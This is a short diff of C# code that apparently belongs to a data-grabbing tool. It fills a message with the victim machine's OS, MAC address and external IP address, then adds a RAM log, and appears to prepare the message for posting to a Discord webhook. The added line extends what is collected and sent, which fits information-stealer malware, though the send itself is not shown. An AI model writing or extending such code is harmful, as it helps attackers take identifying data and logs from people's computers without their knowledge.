@@ -61,7 +61,8 @@ namespace Sprado.Instances
                         .Replace("%create%", DateTime.Now.ToString("dd.MM.yyyy HH:mm"))
                         .Replace("%os%", FriendlyName())
                         .Replace("%mac%", macAddr)
-                        .Replace("%ip%", externalIpString);
+                        .Replace("%ip%", externalIpString)
+                        .Replace("%log%", LogUtils.GetRAMLog());
 
             discordValues.Add("username", UserName);
             discordValues.Add("avatar_url", ProfilePicture);
